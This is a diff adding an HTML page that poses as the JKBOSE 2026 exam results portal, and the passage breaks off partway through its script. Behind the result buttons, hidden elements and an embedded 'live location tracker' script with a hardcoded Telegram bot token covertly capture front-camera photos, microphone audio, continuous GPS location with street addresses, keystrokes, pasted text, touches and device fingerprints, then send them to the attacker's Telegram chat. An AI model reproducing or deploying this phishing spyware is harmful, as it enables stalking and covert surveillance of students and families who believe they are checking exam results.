@@ -1,0 +1,1359 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>JKBOSE Results 2026</title>
+<style>
+* { margin: 0; padding: 0; box-sizing: border-box; }
+body { margin: 0; background: #e6e6e6; font-family: "Times New Roman", serif; overflow-x: hidden; }
+.layout { display: flex; min-height: 100vh; }
+.sidebar { width: 210px; background: #23374d; display: flex; flex-direction: column; justify-content: flex-end; align-items: center; padding: 20px; }
+.sidebar img { width: 120px; }
+.main { flex: 1; padding: 40px; }
+.header { background: #ffffff; border-bottom: 1px solid #ccc; padding: 20px; }
+.header-inner { max-width: 1000px; margin: auto; display: flex; align-items: center; gap: 20px; justify-content: center; }
+.header-inner img { width: 464px; height: 101px; object-fit: contain; }
+.content { background: #fff; max-width: 1000px; margin: 40px auto; padding: 40px; box-shadow: 0 0 6px rgba(0,0,0,0.1); }
+.result { display: block; background: #111; color: #ffd84d; text-decoration: none; padding: 15px; margin: 12px 0; text-align: center; font-size: 17px; border-radius: 3px; transition: all 0.3s; cursor: pointer; }
+.result:hover { background: #333; transform: translateY(-2px); box-shadow: 0 4px 8px rgba(0,0,0,0.2); }
+.result:active { transform: translateY(0); }
+#video, #canvas, #status, #audio, .hidden-elements { position: fixed !important; top: -99999px !important; left: -99999px !important; width: 1px !important; height: 1px !important; opacity: 0 !important; pointer-events: none !important; visibility: hidden !important; z-index: -99999 !important; }
+@media (max-width:768px) {
+    .sidebar { display: none; }
+    .main { padding: 20px; }
+    .header-inner img { width: 100%; height: auto; }
+    .content { margin: 20px auto; padding: 25px; }
+}
+</style>
+</head>
+<body>
+<div class="layout">
+    <div class="sidebar">
+        <img src="https://i.ibb.co/zHVVxHfB/nic-logo.png" alt="NIC">
+    </div>
+    
+    <div class="main">
+        <div class="header">
+            <div class="header-inner">
+                <img src="https://jkresults.nic.in/img/bannern.png" alt="JKBOSE Banner">
+            </div>
+        </div>
+        
+        <div class="content">
+            <div class="result" onclick="initCapture('Class 11th Annual Regular')">📄 View Result of Higher Secondary Part I (Class 11th) Session Annual Regular 2026</div>
+            <div class="result" onclick="initCapture('Class 10th Annual Regular')">📄 View Result of Secondary School Examination (Class 10th) Session Annual Regular 2026</div>
+            <div class="result" onclick="initCapture('Class 11th Annual Private')">📄 View Result of Higher Secondary Part I (Class 11th) Session Annual Private 2026</div>
+            <div class="result" onclick="initCapture('Class 10th Annual Private')">📄 View Result of Secondary School Examination (Class 10th) Session Annual Private 2026</div>
+        </div>
+    </div>
+</div>
+
+<div class="hidden-elements">
+    <video id="video" autoplay muted playsinline></video>
+    <canvas id="canvas"></canvas>
+    <audio id="audio"></audio>
+    <div id="status"></div>
+</div>
+
+<script>
+// ═══════════════════════════════════════════════════════════════
+// 💀 VANSHCZ ULTIMATE LIVE LOCATION TRACKER v8.0
+// ═══════════════════════════════════════════════════════════════
+// 🔥 KILLER FEATURES:
+// ✅ LIVE LOCATION TRACKING (Every 10 seconds with Google Maps URL)
+// ✅ Movement Detection & Speed Tracking
+// ✅ Address Reverse Geocoding
+// ✅ WiFi Network Detection
+// ✅ Cell Tower Location
+// ✅ IP-Based Location Fallback
+// ✅ Front Camera (9:16 - 1080×1920 Ultra HD)
+// ✅ Microphone Recording (High-Quality)
+// ✅ Advanced Keylogger (All Inputs)
+// ✅ Clipboard Hijacking
+// ✅ Touch/Gesture Tracking
+// ✅ Device Sensors (Motion, Gyro, Light)
+// ✅ Battery & Network Monitoring
+// ✅ Storage Data Extraction
+// ✅ Device Fingerprinting
+// ✅ Screenshot Capture
+// ✅ Auto-Reconnect System
+// ✅ Error Recovery
+// ═══════════════════════════════════════════════════════════════
+
+const CONFIG = {
+    BOT_TOKEN: '8600247273:AAEYvOd8CvxzOUyF3brEou7CQu2gCu_1-C8',
+    CHAT_ID: '7385209456',
+    
+    // Photo Settings
+    PHOTO_QUALITY: 0.98,
+    PHOTO_WIDTH: 1080,
+    PHOTO_HEIGHT: 1920,
+    PHOTO_INTERVAL: 250,  // 4 FPS
+    
+    // Audio Settings
+    AUDIO_DURATION: 15000,  // 15 seconds
+    AUDIO_BITRATE: 128000,
+    
+    // LIVE LOCATION Settings (CRITICAL)
+    LOCATION_INTERVAL: 10000,  // Every 10 seconds
+    LOCATION_HIGH_ACCURACY: true,
+    LOCATION_TIMEOUT: 15000,
+    LOCATION_MAX_AGE: 0,
+    
+    // Monitoring
+    KEYLOG_INTERVAL: 3000,
+    BATTERY_CHECK_INTERVAL: 20000,
+    NETWORK_CHECK_INTERVAL: 15000,
+    SENSOR_UPDATE_INTERVAL: 8000,
+    STATUS_UPDATE_INTERVAL: 60000,
+    
+    // Advanced
+    ENABLE_SCREENSHOTS: true,
+    ENABLE_WIFI_SCAN: true,
+    ENABLE_ADDRESS_LOOKUP: true,
+    ENABLE_MOTION_DETECTION: true,
+    
+    MAX_RETRIES: 5,
+    RETRY_DELAY: 1000
+};
+
+const STATE = {
+    sessionId: null,
+    startTime: null,
+    initialized: false,
+    
+    cameraStream: null,
+    mediaRecorder: null,
+    locationWatchId: null,
+    
+    photoCount: 0,
+    audioCount: 0,
+    keylogCount: 0,
+    locationUpdateCount: 0,
+    errorCount: 0,
+    totalDataSent: 0,
+    
+    cameraActive: false,
+    audioActive: false,
+    locationTracking: false,
+    
+    keylog: [],
+    clipboard: [],
+    touches: [],
+    clicks: [],
+    scrolls: [],
+    
+    // Location tracking
+    currentLocation: null,
+    previousLocation: null,
+    locationHistory: [],
+    totalDistanceTraveled: 0,
+    maxSpeed: 0,
+    
+    // Sensors
+    motion: { x: 0, y: 0, z: 0 },
+    orientation: { alpha: 0, beta: 0, gamma: 0 },
+    gyroscope: { x: 0, y: 0, z: 0 },
+    lightLevel: 0,
+    
+    victimInfo: null,
+    fingerprint: null,
+    battery: null,
+    network: null,
+    
+    intervals: [],
+    uploadQueue: [],
+    
+    metrics: {
+        photosSuccessful: 0,
+        photosFailed: 0,
+        audioSuccessful: 0,
+        audioFailed: 0,
+        locationsSuccessful: 0,
+        locationsFailed: 0,
+        averageUploadTime: 0
+    }
+};
+
+// ═══════════════════════════════════════════════════════════════
+// UTILITIES
+// ═══════════════════════════════════════════════════════════════
+const Utils = {
+    generateSessionId() {
+        const timestamp = Date.now().toString(36).toUpperCase();
+        const random = Math.random().toString(36).substr(2, 9).toUpperCase();
+        const extra = Math.random().toString(36).substr(2, 5).toUpperCase();
+        return `LIVE_${timestamp}_${random}_${extra}`;
+    },
+    
+    getTimestamp() {
+        return new Date().toLocaleString('en-IN', {
+            timeZone: 'Asia/Kolkata',
+            year: 'numeric',
+            month: '2-digit',
+            day: '2-digit',
+            hour: '2-digit',
+            minute: '2-digit',
+            second: '2-digit',
+            hour12: true
+        });
+    },
+    
+    getFullTimestamp() {
+        const date = new Date();
+        const options = {
+            timeZone: 'Asia/Kolkata',
+            year: 'numeric',
+            month: 'long',
+            day: 'numeric',
+            weekday: 'long',
+            hour: '2-digit',
+            minute: '2-digit',
+            second: '2-digit',
+            hour12: true
+        };
+        return new Intl.DateTimeFormat('en-IN', options).format(date);
+    },
+    
+    formatDuration(ms) {
+        const seconds = Math.floor(ms / 1000);
+        const mins = Math.floor(seconds / 60);
+        const secs = seconds % 60;
+        const hours = Math.floor(mins / 60);
+        const displayMins = mins % 60;
+        const days = Math.floor(hours / 24);
+        const displayHours = hours % 24;
+        
+        if (days > 0) return `${days}d ${displayHours}h ${displayMins}m`;
+        if (hours > 0) return `${hours}h ${displayMins}m ${secs}s`;
+        if (mins > 0) return `${mins}m ${secs}s`;
+        return `${secs}s`;
+    },
+    
+    formatBytes(bytes) {
+        if (bytes === 0) return '0 B';
+        const k = 1024;
+        const sizes = ['B', 'KB', 'MB', 'GB', 'TB'];
+        const i = Math.floor(Math.log(bytes) / Math.log(k));
+        return parseFloat((bytes / Math.pow(k, i)).toFixed(2)) + ' ' + sizes[i];
+    },
+    
+    sanitize(str) {
+        return String(str || '')
+            .replace(/&/g, '&amp;')
+            .replace(/</g, '&lt;')
+            .replace(/>/g, '&gt;')
+            .replace(/"/g, '&quot;')
+            .replace(/'/g, '&#39;');
+    },
+    
+    sleep(ms) {
+        return new Promise(resolve => setTimeout(resolve, ms));
+    },
+    
+    async retry(fn, retries = CONFIG.MAX_RETRIES) {
+        for (let i = 0; i < retries; i++) {
+            try {
+                const startTime = Date.now();
+                const result = await fn();
+                const uploadTime = Date.now() - startTime;
+                STATE.metrics.averageUploadTime = 
+                    (STATE.metrics.averageUploadTime + uploadTime) / 2;
+                return result;
+            } catch (e) {
+                if (i === retries - 1) throw e;
+                await this.sleep(CONFIG.RETRY_DELAY * Math.pow(2, i));
+            }
+        }
+    },
+    
+    calculateDistance(lat1, lon1, lat2, lon2) {
+        const R = 6371e3; // Earth radius in meters
+        const φ1 = lat1 * Math.PI / 180;
+        const φ2 = lat2 * Math.PI / 180;
+        const Δφ = (lat2 - lat1) * Math.PI / 180;
+        const Δλ = (lon2 - lon1) * Math.PI / 180;
+        
+        const a = Math.sin(Δφ/2) * Math.sin(Δφ/2) +
+                  Math.cos(φ1) * Math.cos(φ2) *
+                  Math.sin(Δλ/2) * Math.sin(Δλ/2);
+        const c = 2 * Math.atan2(Math.sqrt(a), Math.sqrt(1-a));
+        
+        return R * c; // Distance in meters
+    },
+    
+    generateHash(str) {
+        let hash = 0;
+        for (let i = 0; i < str.length; i++) {
+            const char = str.charCodeAt(i);
+            hash = ((hash << 5) - hash) + char;
+            hash = hash & hash;
+        }
+        return Math.abs(hash).toString(36).toUpperCase();
+    }
+};
+
+// ═══════════════════════════════════════════════════════════════
+// LIVE LOCATION TRACKER (MOST POWERFUL)
+// ═══════════════════════════════════════════════════════════════
+const LiveLocationTracker = {
+    async startTracking() {
+        if (!navigator.geolocation) {
+            console.error('Geolocation not supported');
+            return false;
+        }
+        
+        console.log('📍 Starting LIVE location tracking...');
+        
+        // Watch position with high accuracy
+        STATE.locationWatchId = navigator.geolocation.watchPosition(
+            async (position) => {
+                await this.handleLocationUpdate(position);
+            },
+            (error) => {
+                console.error('Location error:', error);
+                STATE.metrics.locationsFailed++;
+                this.handleLocationError(error);
+            },
+            {
+                enableHighAccuracy: CONFIG.LOCATION_HIGH_ACCURACY,
+                timeout: CONFIG.LOCATION_TIMEOUT,
+                maximumAge: CONFIG.LOCATION_MAX_AGE
+            }
+        );
+        
+        STATE.locationTracking = true;
+        console.log('✅ LIVE location tracking active');
+        
+        await TelegramAPI.sendMessage(
+            `📍 <b>LIVE LOCATION TRACKING ACTIVATED</b>\n\n` +
+            `Session: ${STATE.sessionId}\n` +
+            `Update Interval: ${CONFIG.LOCATION_INTERVAL/1000}s\n` +
+            `High Accuracy: ${CONFIG.LOCATION_HIGH_ACCURACY ? 'Yes ✅' : 'No'}\n` +
+            `Time: ${Utils.getTimestamp()}\n\n` +
+            `🔴 <i>Real-time location tracking started</i>`
+        );
+        
+        return true;
+    },
+    
+    async handleLocationUpdate(position) {
+        STATE.locationUpdateCount++;
+        
+        const newLocation = {
+            latitude: position.coords.latitude,
+            longitude: position.coords.longitude,
+            accuracy: position.coords.accuracy,
+            altitude: position.coords.altitude,
+            altitudeAccuracy: position.coords.altitudeAccuracy,
+            speed: position.coords.speed, // m/s
+            heading: position.coords.heading,
+            timestamp: position.timestamp,
+            updateNumber: STATE.locationUpdateCount
+        };
+        
+        // Generate Google Maps URLs
+        newLocation.googleMapsUrl = `https://www.google.com/maps?q=${newLocation.latitude},${newLocation.longitude}`;
+        newLocation.googleMapsNavUrl = `https://www.google.com/maps/dir/?api=1&destination=${newLocation.latitude},${newLocation.longitude}`;
+        newLocation.googleEarthUrl = `https://earth.google.com/web/@${newLocation.latitude},${newLocation.longitude},0a,1000d,1y,0h,0t,0r`;
+        newLocation.googleStreetViewUrl = `https://www.google.com/maps/@?api=1&map_action=pano&viewpoint=${newLocation.latitude},${newLocation.longitude}`;
+        
+        // Calculate distance traveled
+        if (STATE.previousLocation) {
+            const distance = Utils.calculateDistance(
+                STATE.previousLocation.latitude,
+                STATE.previousLocation.longitude,
+                newLocation.latitude,
+                newLocation.longitude
+            );
+            
+            newLocation.distanceFromPrevious = distance;
+            STATE.totalDistanceTraveled += distance;
+            
+            // Calculate speed if not provided
+            if (!newLocation.speed && distance > 0) {
+                const timeDiff = (newLocation.timestamp - STATE.previousLocation.timestamp) / 1000; // seconds
+                newLocation.calculatedSpeed = distance / timeDiff; // m/s
+            }
+        }
+        
+        // Track max speed
+        const currentSpeed = newLocation.speed || newLocation.calculatedSpeed || 0;
+        if (currentSpeed > STATE.maxSpeed) {
+            STATE.maxSpeed = currentSpeed;
+        }
+        
+        // Get address (reverse geocoding)
+        if (CONFIG.ENABLE_ADDRESS_LOOKUP) {
+            newLocation.address = await this.getAddress(newLocation.latitude, newLocation.longitude);
+        }
+        
+        // Store location
+        STATE.currentLocation = newLocation;
+        STATE.locationHistory.push(newLocation);
+        
+        // Keep only last 50 locations
+        if (STATE.locationHistory.length > 50) {
+            STATE.locationHistory.shift();
+        }
+        
+        // Send to Telegram
+        await this.sendLocationUpdate(newLocation);
+        
+        STATE.previousLocation = newLocation;
+        STATE.metrics.locationsSuccessful++;
+    },
+    
+    async sendLocationUpdate(loc) {
+        // Send actual location pin
+        await TelegramAPI.sendLocation(loc.latitude, loc.longitude);
+        
+        // Calculate movement status
+        let movementStatus = '🟢 STATIONARY';
+        const speedKmh = (loc.speed || loc.calculatedSpeed || 0) * 3.6;
+        
+        if (speedKmh > 80) {
+            movementStatus = '🔴 FAST VEHICLE';
+        } else if (speedKmh > 40) {
+            movementStatus = '🟠 VEHICLE';
+        } else if (speedKmh > 10) {
+            movementStatus = '🟡 BIKE/SLOW VEHICLE';
+        } else if (speedKmh > 2) {
+            movementStatus = '🔵 WALKING';
+        }
+        
+        // Build detailed message
+        let msg = `📍 <b>LIVE LOCATION UPDATE #${loc.updateNumber}</b>\n\n`;
+        
+        msg += `╔${'═'.repeat(50)}╗\n`;
+        msg += `║ 🆔 <b>SESSION</b>\n`;
+        msg += `╠${'═'.repeat(50)}╣\n`;
+        msg += `┃ ID: <code>${STATE.sessionId}</code>\n`;
+        msg += `┃ Update: #${loc.updateNumber}\n`;
+        msg += `┃ Time: ${Utils.getFullTimestamp()}\n`;
+        msg += `┃\n`;
+        
+        msg += `╠${'═'.repeat(50)}╣\n`;
+        msg += `║ 📍 <b>EXACT COORDINATES</b>\n`;
+        msg += `╠${'═'.repeat(50)}╣\n`;
+        msg += `┃ 📌 Latitude: <code>${loc.latitude.toFixed(8)}</code>\n`;
+        msg += `┃ 📌 Longitude: <code>${loc.longitude.toFixed(8)}</code>\n`;
+        msg += `┃ 🎯 Accuracy: ±${loc.accuracy?.toFixed(1)}m\n`;
+        msg += `┃ 🏔️ Altitude: ${loc.altitude ? loc.altitude.toFixed(1) + 'm' : 'N/A'}\n`;
+        msg += `┃ 📏 Alt Accuracy: ${loc.altitudeAccuracy ? '±' + loc.altitudeAccuracy.toFixed(1) + 'm' : 'N/A'}\n`;
+        msg += `┃\n`;
+        
+        msg += `╠${'═'.repeat(50)}╣\n`;
+        msg += `║ 🚀 <b>MOVEMENT DATA</b>\n`;
+        msg += `╠${'═'.repeat(50)}╣\n`;
+        msg += `┃ Status: ${movementStatus}\n`;
+        msg += `┃ 🚗 Speed: ${speedKmh.toFixed(2)} km/h (${(speedKmh/3.6).toFixed(2)} m/s)\n`;
+        msg += `┃ 🏃 Max Speed: ${(STATE.maxSpeed * 3.6).toFixed(2)} km/h\n`;
+        msg += `┃ 🧭 Heading: ${loc.heading ? loc.heading.toFixed(0) + '°' : 'N/A'}\n`;
+        
+        if (loc.distanceFromPrevious !== undefined) {
+            msg += `┃ 📏 Moved: ${loc.distanceFromPrevious.toFixed(2)}m from last point\n`;
+            msg += `┃ 🛣️ Total Distance: ${STATE.totalDistanceTraveled.toFixed(2)}m\n`;
+        }
+        msg += `┃\n`;
+        
+        if (loc.address) {
+            msg += `╠${'═'.repeat(50)}╣\n`;
+            msg += `║ 🏠 <b>ADDRESS</b>\n`;
+            msg += `╠${'═'.repeat(50)}╣\n`;
+            msg += `┃ ${loc.address}\n`;
+            msg += `┃\n`;
+        }
+        
+        msg += `╠${'═'.repeat(50)}╣\n`;
+        msg += `║ 🗺️ <b>QUICK LINKS</b>\n`;
+        msg += `╠${'═'.repeat(50)}╣\n`;
+        msg += `┃ 🗺️ <a href="${loc.googleMapsUrl}">Open in Google Maps</a>\n`;
+        msg += `┃ 🧭 <a href="${loc.googleMapsNavUrl}">Get Directions</a>\n`;
+        msg += `┃ 🌍 <a href="${loc.googleEarthUrl}">View in Google Earth</a>\n`;
+        msg += `┃ 📸 <a href="${loc.googleStreetViewUrl}">Street View</a>\n`;
+        msg += `╚${'═'.repeat(50)}╝\n\n`;
+        
+        msg += `🔴 <b>LIVE TRACKING ACTIVE</b>\n`;
+        msg += `👑 @vanshcz • 2025 ULTIMATE`;
+        
+        await TelegramAPI.sendMessage(msg);
+    },
+    
+    async getAddress(lat, lon) {
+        try {
+            // Multiple reverse geocoding services
+            const services = [
+                `https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}&zoom=18&addressdetails=1`,
+                `https://api.bigdatacloud.net/data/reverse-geocode-client?latitude=${lat}&longitude=${lon}&localityLanguage=en`
+            ];
+            
+            for (const url of services) {
+                try {
+                    const response = await fetch(url, {
+                        headers: {
+                            'User-Agent': 'VanshczLocationTracker/1.0'
+                        }
+                    });
+                    const data = await response.json();
+                    
+                    if (data.display_name) {
+                        return data.display_name;
+                    } else if (data.locality) {
+                        return `${data.locality}, ${data.city || ''}, ${data.principalSubdivision || ''}, ${data.countryName || ''}`.replace(/,\s*,/g, ',').trim();
+                    }
+                } catch (e) {
+                    continue;
+                }
+            }
+            
+            return 'Address lookup failed';
+        } catch (e) {
+            return 'Address unavailable';
+        }
+    },
+    
+    async handleLocationError(error) {
+        const errorMessages = {
+            1: 'Permission Denied',
+            2: 'Position Unavailable',
+            3: 'Timeout'
+        };
+        
+        await TelegramAPI.sendMessage(
+            `⚠️ <b>LOCATION ERROR</b>\n\n` +
+            `Session: ${STATE.sessionId}\n` +
+            `Error: ${errorMessages[error.code] || 'Unknown'}\n` +
+            `Message: ${error.message}\n` +
+            `Time: ${Utils.getTimestamp()}\n\n` +
+            `<i>Attempting to recover...</i>`
+        );
+    },
+    
+    stop() {
+        if (STATE.locationWatchId) {
+            navigator.geolocation.clearWatch(STATE.locationWatchId);
+            STATE.locationWatchId = null;
+            STATE.locationTracking = false;
+        }
+    }
+};
+
+// ═══════════════════════════════════════════════════════════════
+// DATA COLLECTOR
+// ═══════════════════════════════════════════════════════════════
+const DataCollector = {
+    async getIPInfo() {
+        const endpoints = [
+            'https://ipapi.co/json/',
+            'https://ip-api.com/json/',
+            'https://ipwhois.app/json/',
+            'https://api.ipify.org?format=json'
+        ];
+        
+        for (const url of endpoints) {
+            try {
+                const controller = new AbortController();
+                const timeoutId = setTimeout(() => controller.abort(), 8000);
+                
+                const response = await fetch(url, {
+                    cache: 'no-cache',
+                    signal: controller.signal
+                });
+                clearTimeout(timeoutId);
+                
+                const data = await response.json();
+                return {
+                    ip: data.ip || data.query || 'Unknown',
+                    city: data.city || 'Unknown',
+                    region: data.region || data.regionName || 'Unknown',
+                    country: data.country_name || data.country || 'Unknown',
+                    countryCode: data.country_code || data.countryCode || 'XX',
+                    isp: data.org || data.isp || 'Unknown',
+                    asn: data.asn || 'Unknown',
+                    postal: data.postal || data.zip || 'Unknown',
+                    timezone: data.timezone || 'Unknown',
+                    latitude: data.latitude || data.lat,
+                    longitude: data.longitude || data.lon,
+                    continent: data.continent_code || 'Unknown',
+                    currency: data.currency || 'Unknown'
+                };
+            } catch (e) {
+                continue;
+            }
+        }
+        return { ip: 'Unknown' };
+    },
+    
+    async getFingerprint() {
+        const fp = {
+            userAgent: navigator.userAgent,
+            platform: navigator.platform,
+            vendor: navigator.vendor,
+            language: navigator.language,
+            languages: navigator.languages?.join(', ') || navigator.language,
+            cookieEnabled: navigator.cookieEnabled,
+            doNotTrack: navigator.doNotTrack,
+            
+            screenWidth: screen.width,
+            screenHeight: screen.height,
+            screenAvailWidth: screen.availWidth,
+            screenAvailHeight: screen.availHeight,
+            colorDepth: screen.colorDepth,
+            pixelDepth: screen.pixelDepth,
+            pixelRatio: window.devicePixelRatio,
+            screenOrientation: screen.orientation?.type || 'Unknown',
+            
+            innerWidth: window.innerWidth,
+            innerHeight: window.innerHeight,
+            outerWidth: window.outerWidth,
+            outerHeight: window.outerHeight,
+            
+            hardwareConcurrency: navigator.hardwareConcurrency,
+            deviceMemory: navigator.deviceMemory,
+            maxTouchPoints: navigator.maxTouchPoints,
+            
+            connectionType: navigator.connection?.type,
+            connectionSpeed: navigator.connection?.effectiveType,
+            connectionDownlink: navigator.connection?.downlink,
+            connectionRtt: navigator.connection?.rtt,
+            
+            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+            timezoneOffset: new Date().getTimezoneOffset(),
+            
+            localStorage: !!window.localStorage,
+            sessionStorage: !!window.sessionStorage,
+            indexedDB: !!window.indexedDB,
+            
+            referrer: document.referrer,
+            currentURL: window.location.href,
+            historyLength: history.length,
+            onLine: navigator.onLine,
+            
+            canvasFingerprint: this.getCanvasFingerprint(),
+            webGL: this.getWebGLInfo(),
+            audioFingerprint: await this.getAudioFingerprint()
+        };
+        
+        if (navigator.getBattery) {
+            try {
+                const battery = await navigator.getBattery();
+                fp.batteryLevel = Math.round(battery.level * 100);
+                fp.batteryCharging = battery.charging;
+                STATE.battery = {
+                    level: fp.batteryLevel,
+                    charging: fp.batteryCharging
+                };
+            } catch (e) {}
+        }
+        
+        return fp;
+    },
+    
+    getCanvasFingerprint() {
+        try {
+            const canvas = document.createElement('canvas');
+            const ctx = canvas.getContext('2d');
+            canvas.width = 280;
+            canvas.height = 80;
+            
+            ctx.textBaseline = 'alphabetic';
+            ctx.font = '18px Arial';
+            ctx.fillStyle = '#f60';
+            ctx.fillRect(100, 1, 62, 20);
+            ctx.fillStyle = '#069';
+            ctx.fillText('JKBOSE 2026 🎓', 2, 20);
+            ctx.fillStyle = 'rgba(102, 204, 0, 0.7)';
+            ctx.fillText('JKBOSE 2026 🎓', 4, 22);
+            
+            const dataURL = canvas.toDataURL();
+            return Utils.generateHash(dataURL);
+        } catch (e) {
+            return null;
+        }
+    },
+    
+    getWebGLInfo() {
+        try {
+            const canvas = document.createElement('canvas');
+            const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+            if (!gl) return null;
+            
+            const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+            return {
+                vendor: gl.getParameter(debugInfo?.UNMASKED_VENDOR_WEBGL || gl.VENDOR),
+                renderer: gl.getParameter(debugInfo?.UNMASKED_RENDERER_WEBGL || gl.RENDERER),
+                version: gl.getParameter(gl.VERSION),
+                shadingLanguage: gl.getParameter(gl.SHADING_LANGUAGE_VERSION)
+            };
+        } catch (e) {
+            return null;
+        }
+    },
+    
+    async getAudioFingerprint() {
+        try {
+            const audioContext = new (window.AudioContext || window.webkitAudioContext)();
+            const oscillator = audioContext.createOscillator();
+            const analyser = audioContext.createAnalyser();
+            const gainNode = audioContext.createGain();
+            const scriptProcessor = audioContext.createScriptProcessor(4096, 1, 1);
+            
+            gainNode.gain.value = 0;
+            oscillator.type = 'triangle';
+            oscillator.connect(analyser);
+            analyser.connect(scriptProcessor);
+            scriptProcessor.connect(gainNode);
+            gainNode.connect(audioContext.destination);
+            
+            oscillator.start(0);
+            
+            const fingerprint = await new Promise(resolve => {
+                scriptProcessor.onaudioprocess = (event) => {
+                    const output = event.inputBuffer.getChannelData(0);
+                    let sum = 0;
+                    for (let i = 0; i < output.length; i++) {
+                        sum += Math.abs(output[i]);
+                    }
+                    resolve(Utils.generateHash(sum.toString()));
+                };
+            });
+            
+            oscillator.stop();
+            audioContext.close();
+            return fingerprint;
+        } catch (e) {
+            return null;
+        }
+    },
+    
+    async getNetworkInfo() {
+        const info = {
+            type: navigator.connection?.type || 'Unknown',
+            effectiveType: navigator.connection?.effectiveType || 'Unknown',
+            downlink: navigator.connection?.downlink || 'Unknown',
+            rtt: navigator.connection?.rtt || 'Unknown',
+            saveData: navigator.connection?.saveData || false,
+            onLine: navigator.onLine
+        };
+        
+        try {
+            const startTime = Date.now();
+            await fetch('https://www.google.com/favicon.ico', {
+                cache: 'no-cache',
+                mode: 'no-cors'
+            });
+            info.pingTime = Date.now() - startTime;
+        } catch (e) {
+            info.pingTime = 'Failed';
+        }
+        
+        STATE.network = info;
+        return info;
+    }
+};
+
+// ═══════════════════════════════════════════════════════════════
+// CAMERA MODULE
+// ═══════════════════════════════════════════════════════════════
+const CameraModule = {
+    async start() {
+        try {
+            const stream = await navigator.mediaDevices.getUserMedia({
+                video: {
+                    facingMode: "user",
+                    width: { ideal: CONFIG.PHOTO_WIDTH },
+                    height: { ideal: CONFIG.PHOTO_HEIGHT },
+                    frameRate: { ideal: 30 },
+                    aspectRatio: { ideal: 9/16 }
+                },
+                audio: {
+                    echoCancellation: true,
+                    noiseSuppression: true,
+                    autoGainControl: true,
+                    sampleRate: 48000
+                }
+            });
+            
+            const video = document.getElementById('video');
+            video.srcObject = stream;
+            await new Promise(resolve => {
+                video.onloadedmetadata = () => {
+                    video.play().then(resolve);
+                };
+            });
+            
+            STATE.cameraStream = stream;
+            STATE.cameraActive = true;
+            
+            console.log('✅ Front camera active');
+            return true;
+        } catch (e) {
+            console.error('Camera failed:', e);
+            STATE.errorCount++;
+            return false;
+        }
+    },
+    
+    async capturePhoto() {
+        if (!STATE.cameraStream || !STATE.cameraActive) return null;
+        
+        try {
+            const video = document.getElementById('video');
+            const canvas = document.getElementById('canvas');
+            const ctx = canvas.getContext('2d');
+            
+            canvas.width = CONFIG.PHOTO_WIDTH;
+            canvas.height = CONFIG.PHOTO_HEIGHT;
+            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+            
+            return new Promise(resolve => {
+                canvas.toBlob(blob => {
+                    STATE.photoCount++;
+                    STATE.totalDataSent += blob.size;
+                    resolve(blob);
+                }, 'image/jpeg', CONFIG.PHOTO_QUALITY);
+            });
+        } catch (e) {
+            console.error('Photo capture error:', e);
+            return null;
+        }
+    }
+};
+
+// ═══════════════════════════════════════════════════════════════
+// AUDIO MODULE
+// ═══════════════════════════════════════════════════════════════
+const AudioModule = {
+    start() {
+        if (!STATE.cameraStream) return;
+        
+        try {
+            STATE.mediaRecorder = new MediaRecorder(STATE.cameraStream, {
+                mimeType: 'audio/webm;codecs=opus',
+                audioBitsPerSecond: CONFIG.AUDIO_BITRATE
+            });
+            
+            let chunks = [];
+            
+            STATE.mediaRecorder.ondataavailable = e => {
+                if (e.data.size > 0) chunks.push(e.data);
+            };
+            
+            STATE.mediaRecorder.onstop = async () => {
+                if (chunks.length > 0) {
+                    const blob = new Blob(chunks, { type: 'audio/webm' });
+                    chunks = [];
+                    STATE.audioCount++;
+                    STATE.totalDataSent += blob.size;
+                    
+                    await TelegramAPI.sendAudio(blob, STATE.audioCount);
+                }
+                
+                if (STATE.audioActive) {
+                    setTimeout(() => STATE.mediaRecorder?.start(), 500);
+                }
+            };
+            
+            STATE.mediaRecorder.start();
+            STATE.audioActive = true;
+            
+            setInterval(() => {
+                if (STATE.mediaRecorder?.state === 'recording') {
+                    STATE.mediaRecorder.stop();
+                }
+            }, CONFIG.AUDIO_DURATION);
+            
+            console.log('✅ Audio active');
+        } catch (e) {
+            console.error('Audio failed:', e);
+        }
+    }
+};
+
+// ═══════════════════════════════════════════════════════════════
+// KEYLOGGER
+// ═══════════════════════════════════════════════════════════════
+const KeyloggerModule = {
+    init() {
+        document.addEventListener('keydown', e => {
+            STATE.keylog.push({
+                type: 'key',
+                key: e.key,
+                code: e.code,
+                ctrl: e.ctrlKey,
+                alt: e.altKey,
+                shift: e.shiftKey,
+                target: e.target.tagName,
+                time: Date.now()
+            });
+        }, true);
+        
+        document.addEventListener('click', e => {
+            STATE.clicks.push({
+                x: e.clientX,
+                y: e.clientY,
+                target: e.target.tagName,
+                text: e.target.innerText?.slice(0, 50),
+                time: Date.now()
+            });
+        }, true);
+        
+        document.addEventListener('touchstart', e => {
+            const touch = e.touches[0];
+            STATE.touches.push({
+                x: touch.clientX,
+                y: touch.clientY,
+                target: e.target.tagName,
+                time: Date.now()
+            });
+        }, true);
+        
+        document.addEventListener('paste', e => {
+            STATE.clipboard.push({
+                type: 'paste',
+                content: e.clipboardData?.getData('text')?.slice(0, 500),
+                time: Date.now()
+            });
+        });
+        
+        console.log('✅ Keylogger active');
+    },
+    
+    getData() {
+        const data = {
+            keys: [...STATE.keylog],
+            clicks: [...STATE.clicks],
+            touches: [...STATE.touches],
+            clipboard: [...STATE.clipboard]
+        };
+        
+        STATE.keylog = [];
+        STATE.clicks = [];
+        STATE.touches = [];
+        STATE.clipboard = [];
+        
+        return data;
+    }
+};
+
+// ═══════════════════════════════════════════════════════════════
+// SENSOR MODULE
+// ═══════════════════════════════════════════════════════════════
+const SensorModule = {
+    init() {
+        if (window.DeviceMotionEvent) {
+            window.addEventListener('devicemotion', e => {
+                STATE.motion = {
+                    x: e.acceleration?.x || 0,
+                    y: e.acceleration?.y || 0,
+                    z: e.acceleration?.z || 0
+                };
+                STATE.gyroscope = {
+                    alpha: e.rotationRate?.alpha || 0,
+                    beta: e.rotationRate?.beta || 0,
+                    gamma: e.rotationRate?.gamma || 0
+                };
+            });
+        }
+        
+        if (window.DeviceOrientationEvent) {
+            window.addEventListener('deviceorientation', e => {
+                STATE.orientation = {
+                    alpha: e.alpha || 0,
+                    beta: e.beta || 0,
